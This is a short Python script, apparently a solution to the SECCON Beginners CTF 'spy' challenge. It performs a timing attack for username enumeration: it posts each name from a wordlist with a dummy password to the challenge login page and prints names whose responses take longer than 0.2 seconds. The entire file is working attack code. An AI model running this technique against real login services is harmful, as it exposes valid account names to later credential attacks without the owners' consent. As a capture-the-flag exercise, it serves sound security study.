#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import time

url = "https://spy.quals.beginners.seccon.jp/"

with open('employees.txt', 'r') as f:
    candidates = f.readlines()

def attack(username):
    payload = {
        'name': username,
        'password': 'test'
    }
    start = time.time()
    res = requests.post(url, data=payload)
    elasped_time = time.time() - start
    return elasped_time

for c in candidates:
    t = attack(c.strip())
    if (t > 0.2):
        print(c.strip(), t)